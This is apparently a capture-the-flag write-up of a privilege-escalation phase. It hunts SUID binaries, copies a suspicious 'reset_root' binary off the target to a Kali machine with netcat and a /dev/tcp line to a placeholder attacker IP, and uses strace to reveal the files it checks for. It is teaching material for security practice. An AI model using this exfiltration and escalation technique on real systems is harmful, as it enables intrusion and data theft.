# Phase 2: Privilege Escalation Analysis 🔬

Once I got the initial shell as the `apache` user, my main goal was to find a way to become `root`. Here is how I analyzed the system and found the vulnerability.

## 1. Hunting for SUID Binaries
I started looking for files with SUID permissions—meaning files that run with the privileges of the file owner (which is usually root). I ran this classic command:

```bash
find / -perm -4000 -type f 2>/dev/null
Out of all the standard Linux binaries, one stood out like a sore thumb:
👉 /usr/bin/reset_root

I tried running it right away to see what it does, but it just threw an error:
"RESET FAILED, ALL TRIGGERS ARE NOT PRESENT."

It didn't explain what the triggers were, and running strings on it just gave me a bunch of garbled text. I needed to see what this binary was doing under the hood.

2. Exfiltrating the Binary to Kali
The victim machine was pretty bare-bones and didn't have any debugging or tracing tools installed. So, I decided to exfiltrate (transfer) the binary over to my own Kali Linux machine where I have full control.

I used a quick Netcat trick to move the file over the network:

On my Kali machine (Setting up a listener to save the file):

Bash
nc -lnvp 3333 > reset_root
On the target machine (Sending the file over TCP):

Bash
cat /usr/bin/reset_root > /dev/tcp/YOUR_KALI_IP/3333
Within a few seconds, the binary was safely landed on my Kali box.

3. X-Raying the Binary with strace
Once the file was on my Kali, I made it executable using chmod +x reset_root.

To find out what "triggers" the binary was complaining about, I used strace (System Trace). This tool monitors all the system calls the program makes to the Linux kernel—like when it tries to open or check a file.

Since a normal strace output is huge and messy, I piped it into grep to look specifically for the access() function (which Linux uses to check if a file exists):

Bash
strace ./reset_root 2>&1 | grep access
The Revelation:
The rentgen worked flawlessly. strace exposed exactly what the binary was doing secretly in the background:

Plaintext
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
access("/dev/shm/kHgTFI5G", F_OK)       = -1 ENOENT (No such file or directory)
access("/dev/shm/Zw7bV9U5", F_OK)       = -1 ENOENT (No such file or directory)
access("/tmp/kcM0Wewe", F_OK)           = -1 ENOENT (No such file or directory)
Ignore the first one (that's just standard Linux behavior), but look at the other three! The binary was looking for three very specific, randomly named files:

/dev/shm/kHgTFI5G

/dev/shm/Zw7bV9U5

/tmp/kcM0Wewe

Because these files didn't exist (ENOENT), the program kept failing. Now I had the secret keys to trick the binary.
